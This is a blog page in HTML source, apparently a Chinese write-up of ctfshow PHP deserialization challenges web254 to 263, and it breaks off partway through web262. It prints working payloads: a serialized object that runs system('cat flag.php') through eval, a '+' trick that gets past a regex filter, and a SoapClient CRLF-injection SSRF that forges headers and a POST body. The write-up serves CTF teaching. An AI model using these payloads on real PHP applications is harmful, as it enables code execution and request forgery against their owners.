@@ -1,0 +1,463 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow反序列化 web254-263 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web254定义了username和password的值，直接传入：username=xxxxxx&amp;amp;password=xxxxxx即可。
+web255传入的username和password,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow反序列化 web254-263</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow反序列化 web254-263</h1>
+        <div class="stuff">
+            <span>八月 22, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E9%A2%98%E6%96%B0%E7%9F%A5/" rel="tag">反序列化解题新知</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><p>定义了username和password的值，直接传入：username=xxxxxx&amp;password=xxxxxx即可。</p>
+<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><p>传入的username和password相同即可，在cookie处传参时要把序列化结果中的分号换成URL编码字符进行连接。</p>
+<p><img src="1.png"></p>
+<p><img src="2.png"></p>
+<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><p>比上一关多了一个对username和password的判断语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line"></span><br><span class="line">​          <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">​       &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>只要传入的username和password的值不一样即可，与构造cookie时的username和password对应。</p>
+<p><img src="3.png"></p>
+<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><ul>
+<li><p>有类的构造，eval($this-&gt;code);eval函数执行PHP代码，所以可以将system(‘cat flag.php’); 赋值给参数code。</p>
+</li>
+<li><p>根据代码可知:如果我们要利用到eval输出，那么就要使用到backDoor类的getInfo()方法，然后在ctfShowUser类的__destruct中发现了$this-&gt;class-&gt;getInfo();，那么我们只需要让$this-&gt;class是backDoor类的实例化就可以了。</p>
+</li>
+<li><p>因此在__construct()中让new backDoor()覆盖$this-&gt;class，执行到__destruct时即可触发backDoor类的getInfo()方法。</p>
+</li>
+<li><p>构造payload：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="4.png"></p>
+<h3 id="web258（加号绕过检测）"><a href="#web258（加号绕过检测）" class="headerlink" title="web258（加号绕过检测）"></a>web258（加号绕过检测）</h3><p>构造思路和上面一样，但是这里的属性均为pulic，需要改一下；还增加了一个正则匹配：</p>
+<p><img src="5.png"></p>
+<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
+<li>[oc]:</li>
+</ul>
+<p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、</p>
+<p>及这些特定字符的组合，组成一个“规则字符串”，</p>
+<p>这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p>
+<ul>
+<li><p>\d:  匹配一个数字字符。等价于 [0-9]。</p>
+</li>
+<li><p> +:  匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</p>
+</li>
+<li><p>/i:  表示匹配的时候不区分大小写</p>
+</li>
+</ul>
+<p>所以这个正则表达式就是用来检测cookie传入的值中是否有数字。</p>
+<ul>
+<li>因此传进来的序列化结果是一定存在数字的，只要在O:+数字O后面加上一个+就能绕过了。</li>
+</ul>
+<p>放一个加号可以直接退出序列处理，从而绕过正则匹配。</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ul>
+<li>payload：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因此这里只要在O:11和O:8前面加上+号就可以了，但是这里要使用URL编码，直接加加号是没有没有回显的。</p>
+<p><img src="6.png"></p>
+<h3 id="web259（php原生类反序列化）"><a href="#web259（php原生类反序列化）" class="headerlink" title="web259（php原生类反序列化）"></a>web259（php原生类反序列化）</h3><h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="PHP原生类反序列化利用"><a href="#PHP原生类反序列化利用" class="headerlink" title="PHP原生类反序列化利用"></a><strong>PHP原生类反序列化利用</strong></h5><ul>
+<li>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</li>
+</ul>
+<p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(<em>SOAP</em> 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)。</p>
+<p>正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法。</p>
+<ul>
+<li>该类的构造函数如下：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ]）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第一个参数是用来指明是否是wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<ul>
+<li><p>正常情况下使用soapclient这个类：</p>
+<p>执行代码需要编辑 php.ini 取消该行注释即可</p>
+<p>extension=php_soap.dll</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;bbb&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://192.168.1.7:5555/path&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;not_exists_function();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="7.png"></p>
+<p>反序列化调用了一个 SoapClient不存在的方法，因此触发了__call魔术方法，执行这段代码的相应信息中，在响应头处有个SOAPAction，参数就是我们传进去的uri的值“bbb”，可见uri处的参数是可控的。</p>
+<h5 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h5><ul>
+<li>CRLF是”回车 + 换行”(\r\n)的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码</li>
+</ul>
+<p>即header头中每一行都是通过这两个CRLF进行不同行显示的。</p>
+<ul>
+<li>从上面可知soapaction处的参数是可控的，我们可以尝试注入自己恶意构造的<strong>CRLF，</strong>POST请求的header就可以被控制。</li>
+</ul>
+<p>代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;bbb\r\n\r\nccc\r\n&quot;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;not_exists_function();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="8.png"></p>
+<ul>
+<li>但Content-Type在SOAPAction的上面，我们无法控制Content-Typ,也就不能控制POST的传输数据。</li>
+</ul>
+<p>SoapClient类的文档中有这样一句解释：</p>
+<p><img src="9.png"></p>
+<p>可以看到options参数中还有一个选项为user_agent，运行我们自己设置User-Agent的值。</p>
+<ul>
+<li><p>因为Content-Type为和Content-Length都在User-Agent之下，当我们可以控制user-agent的值时，也就意味着我们完全可以构造一个POST请求。</p>
+</li>
+<li><p>通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容：</p>
+</li>
+</ul>
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>具体代码来源看：<a target="_blank" rel="noopener" href="https://www.freesion.com/article/1911782007/">https://www.freesion.com/article/1911782007/</a></p>
+<ul>
+<li>输出：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">10</span>:<span class="string">&quot;SoapClient&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;uri&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;aaab&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;location&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;http://127.0.0.1:5555/path&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;_user_agent&quot;</span>;s:<span class="number">150</span>:<span class="string">&quot;wupco Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Cookie: PHPSESSID=my_session Content-Length: 14 data=something&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;_soap_version&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="10.png"></p>
+<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><ul>
+<li>了解了这些前置的知识之后我们回到题目：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">​	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">​		file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>题目中存在反序列化的构造思路，但是没有可以调用的类，这时就需要考虑到PHP原生类的反序列化。</li>
+</ul>
+<p>题目调用了原生类SoapClient不存在的方法getFlag，那么就会调用__call()魔术方法。</p>
+<ul>
+<li><p>要想得到flag，必须本地访问flag.php而且带上token。对于本地ip的构造，不能直接添加xff，利用PHP原生类的反序列化结合CRLF实现ssrf进行请求头的伪造。</p>
+</li>
+<li><p>构造的payload如下：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">​        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;feng\r\nx-forwarded-for:127.0.0.1,127.0.0.1\r\nContent-type:application/x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line"></span><br><span class="line">​        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;feng&#x27;</span>,</span><br><span class="line"></span><br><span class="line">​        <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line"></span><br><span class="line">​    )</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">\<span class="comment">#$c = unserialize($b);</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#$c-&gt;not_a_function();//调用不存在的方法，让SoapClient调用__call</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>location就是我们要访问的url，其中uri也是不可缺少的.</li>
+</ul>
+<p>因为Content-length的限制，post只取到token=ctfshow，成功把下面的那些东西给吃掉了，实现了自己构造POST的请求包。</p>
+<p>get传参（URL编码形式，直接传序列化结果不行，可能是编码问题吧）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vip=O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>feng%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A125%<span class="number">3</span>A%<span class="number">22</span>feng%<span class="number">0</span>D%<span class="number">0</span>Ax-forwarded-<span class="keyword">for</span>%<span class="number">3</span>A127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>C127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-type%<span class="number">3</span>Aapplication%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-length%<span class="number">3</span>A13%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Atoken%<span class="number">3</span>Dctfshow%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>然后访问flag.txt即可：</li>
+</ul>
+<p><img src="11.png"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/1911782007/">https://www.freesion.com/article/1911782007/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/100569464">https://blog.csdn.net/qq_42181428/article/details/100569464</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/113588692">https://y4tacker.blog.csdn.net/article/details/113588692</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113808539">https://blog.csdn.net/rfrder/article/details/113808539</a></p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p>
+<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><p>直接给ctfshow传入ctfshow_i_love_36D序列化后的值即可。</p>
+<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><p>未写。</p>
+<h3 id="web262（反序列化字符串逃逸-变长）"><a href="#web262（反序列化字符串逃逸-变长）" class="headerlink" title="web262（反序列化字符串逃逸-变长）"></a>web262（反序列化字符串逃逸-变长）</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"></span><br><span class="line">  <span 